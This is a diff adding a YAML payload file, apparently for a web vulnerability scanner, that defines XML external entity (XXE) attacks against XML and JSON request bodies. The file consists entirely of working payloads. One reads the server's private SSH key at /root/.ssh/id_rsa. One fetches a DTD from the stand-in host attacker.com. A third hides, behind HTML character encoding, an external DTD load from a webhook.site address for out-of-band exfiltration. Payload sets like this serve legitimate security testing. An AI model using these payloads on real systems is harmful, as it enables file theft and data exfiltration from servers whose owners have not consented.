@@ -1,0 +1,11 @@
+payload:
+    - <!DOCTYPE x [<!ENTITY xxe PUBLIC "foo" "file:///root/.ssh/id_rsa">]><r>&xxe;</r>
+    - <!DOCTYPE x [<!ENTITY xxe PUBLIC "foo" "ftp://attacker.com/evil.dtd">]><r>&xxe;</r>
+    - '{"xmlContent":"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % aaa \"&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x65;&#x62;&#x68;&#x6f;&#x6f;&#x6b;&#x2e;&#x73;&#x69;&#x74;&#x65;&#x2f;&#x33;&#x31;&#x37;&#x30;&#x32;&#x38;&#x34;&#x63;&#x2d;&#x35;&#x65;&#x34;&#x38;&#x2d;&#x34;&#x61;&#x31;&#x36;&#x2d;&#x62;&#x61;&#x31;&#x33;&#x2d;&#x66;&#x37;&#x31;&#x36;&#x34;&#x62;&#x31;&#x33;&#x37;&#x37;&#x38;&#x63;&#x2f;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3e;\">%aaa;%dtd]><foo>&aaa;</foo>","documentType":"invoice"}'
+encoder:
+    - Plain
+placeholder:
+    - RequestBody
+    - XMLBody
+    - JSONRequest
+type: XXE
